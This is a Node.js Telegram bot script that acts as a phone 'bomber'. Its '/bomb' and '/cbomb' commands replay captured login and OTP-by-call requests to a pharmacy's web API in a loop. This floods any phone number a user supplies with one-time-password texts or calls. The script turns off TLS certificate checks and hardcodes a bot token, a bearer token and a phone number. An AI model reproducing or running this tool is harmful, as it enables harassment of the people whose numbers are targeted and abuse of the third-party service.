var request = require("request");
const { Telegraf } = require("telegraf");

const bot = new Telegraf("5949867453:AAH8R_CPSDwVe3H5ey9yyfxG2KGVdfofO60");

process.env["NODE_TLS_REJECT_UNAUTHORIZED"] = 0;

var burp0_bodyString =
  '{"operationName":"Login","variables":{"mobileNumber":"+91num","loginType":"PATIENT"},"query":"query Login($mobileNumber: String!, $loginType: LOGIN_TYPE!) {\\n  login(mobileNumber: $mobileNumber, loginType: $loginType) {\\n    status\\n    message\\n    loginId\\n    __typename\\n  }\\n}\\n"}';
var NUM = 9058528760;
var burp0_headers = {
  "Content-Length": "292",
  "Sec-Ch-Ua": '"Not?A_Brand";v="8", "Chromium";v="108"',
  Accept: "*/*",
  "Content-Type": "application/json",
  "Sec-Ch-Ua-Mobile": "?0",
  Authorization: "Bearer 3d1833da7020e0602165529446587434",
  "User-Agent":
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.5359.72 Safari/537.36",
  "Sec-Ch-Ua-Platform": '"Windows"',
  Origin: "https://www.apollopharmacy.in",
  "Sec-Fetch-Site": "cross-site",
  "Sec-Fetch-Mode": "cors",
  "Sec-Fetch-Dest": "empty",
  Referer: "https://www.apollopharmacy.in/",
  "Accept-Encoding": "gzip, deflate",
  "Accept-Language": "en-GB,en-US;q=0.9,en;q=0.8",
  Connection: "close",
};

//--------------------call-------------------

var burp1_bodyString =
  '{"operationName":"getOTPOnCall","variables":{"mobileNumber":"+91num","loginType":"PATIENT","id":"0274efb0-7c96-11ed-9e76-87aadc32f682"},"query":"query getOTPOnCall($mobileNumber: String, $loginType: LOGIN_TYPE, $id: String!) {\\n  getOTPOnCall(mobileNumber: $mobileNumber, loginType: $loginType, id: $id) {\\n    status\\n    loginId\\n    message\\n    __typename\\n  }\\n}\\n"}';

var burp1_headers = {
  "User-Agent":
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:107.0) Gecko/20100101 Firefox/107.0",
  Accept: "*/*",
  "Accept-Language": "en-US,en;q=0.5",
  "Accept-Encoding": "gzip, deflate",
  Referer: "https://www.apollopharmacy.in/",
  "Content-Type": "application/json",
  Authorization: "Bearer 3d1833da7020e0602165529446587434",
  "Content-Length": "378",
  Origin: "https://www.apollopharmacy.in",
  "Sec-Fetch-Dest": "empty",
  "Sec-Fetch-Mode": "cors",
  "Sec-Fetch-Site": "cross-site",
  Te: "trailers",
  Connection: "close",
};
//-----------------------------call-------------
bot.start((ctx) => {
  ctx.reply(
    "hi Welcome,To start bombing type                /bomb number count"
  );
});
bot.command("/bomb", (ctx) => {
  let n = ctx.message.text;
  let narray = n.split(" ");
  console.log(narray);
  NUM = narray[1];
  let count = narray[2];
  var burp0_options = {
    url: "https://webapi.apollo247.com:443/",
    headers: burp0_headers,
    method: "post",
    body: burp0_bodyString.replace("num", NUM),
  };

  if (count > 5 && count <= 15) {
    ctx.reply("enter auth code");
    bot.hears("001", (ctx) => {
      for (let i = 0; i < count; i++) {
        request(burp0_options, function (error, response, body) {
          console.log("statusCode:", response && response.statusCode);
          console.log("error: ", error);
          console.log("body: ", body);
          if (i == count - 1) ctx.reply("done");
        });
      }
    });
  } else if (count > 15) {
    ctx.reply("enter auth code");
    bot.hears("022", (ctx) => {
      for (let i = 0; i < count; i++) {
        request(burp0_options, function (error, response, body) {
          console.log("statusCode:", response && response.statusCode);
          console.log("error: ", error);
          console.log("body: ", body);
          if (i == count - 1) ctx.reply("done");
        });
      }
    });
  } else {
    for (let i = 0; i < count; i++) {
      request(burp0_options, function (error, response, body) {
        console.log("statusCode:", response && response.statusCode);
        console.log("error: ", error);
        console.log("body: ", body);
        if (i == count - 1) ctx.reply("done");
        console.log(burp0_bodyString);
      });
    }
  }
  // burp0_bodyString=burp1_bodyString.replace("num",num)
  // console.log(burp0_bodyString);
});

//----------------call-------------

bot.command("/cbomb", (ctx) => {
  let n = ctx.message.text;
  let narray = n.split(" ");
  console.log(narray);
  NUM = narray[1];
  let count = narray[2];
  var burp1_options = {
    url: "https://webapi.apollo247.com:443/",
    headers: burp1_headers,
    method: "post",
    body: burp1_bodyString.replace("num", NUM),
  };

  if (count > 1 && count <= 3) {
    ctx.reply("enter auth code");
    bot.hears("001", (ctx) => {
      for (let i = 0; i < count; i++) {
        request(burp1_options, function (error, response, body) {
          console.log("statusCode:", response && response.statusCode);
          console.log("error: ", error);
          console.log("body: ", body);
          if (i == count - 1) ctx.reply("done");
        });
      }
    });
  } else if (count > 3 && count < 5) {
    ctx.reply("enter auth code");
    bot.hears("022", (ctx) => {
      for (let i = 0; i < count; i++) {
        request(burp1_options, function (error, response, body) {
          console.log("statusCode:", response && response.statusCode);
          console.log("error: ", error);
          console.log("body: ", body);
          if (i == count - 1) ctx.reply("done");
        });
      }
    });
  } else {
    for (let i = 0; i < count; i++) {
      request(burp1_options, function (error, response, body) {
        console.log("statusCode:", response && response.statusCode);
        console.log("error: ", error);
        console.log("body: ", body);
        if (i == count - 1) ctx.reply("done");
        console.log(burp1_bodyString);
      });
    }
  }
  // burp0_bodyString=burp1_bodyString.replace("num",num)
  // console.log(burp0_bodyString);
});

//----------------call-----------

bot.help((ctx) => ctx.reply("Send me a sticker"));
bot.on("sticker", (ctx) => ctx.reply("👍"));
bot.hears("hi", (ctx) => ctx.reply("Hey there"));
bot.launch();

// Enable graceful stop
process.once("SIGINT", () => bot.stop("SIGINT"));
process.once("SIGTERM", () => bot.stop("SIGTERM"));
//====================================================
